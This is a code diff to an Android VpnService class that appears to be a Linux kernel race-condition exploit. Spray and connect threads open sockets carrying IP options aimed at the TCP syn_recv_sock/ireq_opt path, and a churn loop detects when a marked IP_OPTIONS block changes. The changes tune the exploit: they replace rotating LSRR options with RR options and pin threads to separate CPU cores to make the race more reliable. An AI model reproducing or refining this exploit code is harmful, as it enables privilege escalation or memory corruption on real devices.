@@ -68,14 +68,11 @@ public class MiniVpn extends VpnService implements Runnable {
     static final int WORKERS = 3;
 
     /**
-     * LSRR address pool. Inside the LAN subnet so the lookup resolves, but
-     * rotated on every attempt so the dst cache never warms up and
-     * ip_route_output_slow() runs each time.
-     * 192.168.204.0/24-ish, 1000 addresses, prime stride.
+     * CPU layout: spray threads on 0..WORKERS-1, connect threads on
+     * WORKERS..2*WORKERS-1, churn on its own core. Keeping the two kernel
+     * paths on separate cores stops them from preempting each other.
      */
-    static final int LSRC_BASE = 0xC0A8CC00;
-    static final int LSRC_RANGE = 1000;
-    static final int LSRC_STRIDE = 251;
+    static final int CPU_CHURN = 6;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
@@ -128,10 +125,13 @@ public class MiniVpn extends VpnService implements Runnable {
 
         for (int w = 0; w < WORKERS; w++) {
             final int sport = PINNED_SPORT - w;
+            final int sprayCpu = w;
+            final int connCpu = WORKERS + w;
 
             Thread spray = new Thread(new Runnable() {
                 @Override
                 public void run() {
+                    nativePinCpu(sprayCpu);
                     sprayLoop(sport);
                 }
             }, "spray" + w);
@@ -140,6 +140,7 @@ public class MiniVpn extends VpnService implements Runnable {
             Thread conn = new Thread(new Runnable() {
                 @Override
                 public void run() {
+                    nativePinCpu(connCpu);
                     clientLoop(sport);
                 }
             }, "conn" + w);
@@ -149,6 +150,7 @@ public class MiniVpn extends VpnService implements Runnable {
         Thread detect = new Thread(new Runnable() {
             @Override
             public void run() {
+                nativePinCpu(CPU_CHURN);
                 churnLoop();
             }
         }, "churn");
@@ -248,11 +250,14 @@ public class MiniVpn extends VpnService implements Runnable {
     /** Create a socket with a marked IP_OPTIONS block. Returns fd or -errno. */
     static native int nativeChurn(int mark);
 
-    /** Non-blocking connect with an LSRR option. Returns fd or -errno. */
-    static native int nativeConnectLsrc(int sport, int lsrc, int dport);
+    /** Non-blocking connect with an RR option (needed for a non-NULL ireq_opt). */
+    static native int nativeConnectRr(int sport, int dport);
 
     /** 1 = established, 0 = pending, negative = errno. */
     static native int nativePollConnect(int fd, int micros);
+
+    /** Pin the calling thread to one CPU. */
+    static native void nativePinCpu(int cpu);
 
     /** 1 = block still matches baseline, 0 = changed, -1 = error. */
     static native int nativeCompare(int fd, byte[] baseline);
@@ -329,14 +334,7 @@ public class MiniVpn extends VpnService implements Runnable {
         while (running) {
             i++;
 
-            /*
-             * Rotate the LSRR address so the route lookup inside
-             * syn_recv_sock() has to walk the FIB every time instead of
-             * hitting a cached dst. That is what widens the race window.
-             */
-            int lsrc = LSRC_BASE + ((i * LSRC_STRIDE) % LSRC_RANGE);
-
-            int fd = nativeConnectLsrc(sport, lsrc, PORT);
+            int fd = nativeConnectRr(sport, PORT);
             if (fd < 0) {
                 bindFail.incrementAndGet();
                 if (bindFail.get() <= 3) {
